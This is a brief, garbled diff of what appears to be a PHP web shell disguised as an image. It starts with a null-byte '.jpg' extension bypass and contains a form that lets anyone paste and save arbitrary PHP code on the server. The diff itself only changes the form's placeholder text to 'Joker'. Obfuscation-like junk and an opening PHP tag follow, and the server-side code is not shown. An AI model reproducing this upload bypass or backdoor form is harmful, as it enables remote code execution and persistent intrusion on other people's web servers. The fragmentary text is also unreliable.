@@ -1,5 +1,5 @@
 %00.jpg;%0n;0n;%20<form method="post">
-    <textarea name="code" rows="25" cols="100" placeholder="Paste kode PHP di sini"></textarea><br>
+    <textarea name="code" rows="25" cols="100" placeholder="Joker"></textarea><br>
     <button type="submit">Simpan</button>
 </form>
 <===+_-_-_<??>*%#%!*htmlspecialchars("%")*!%#%*<??>_-_-_+===><?php
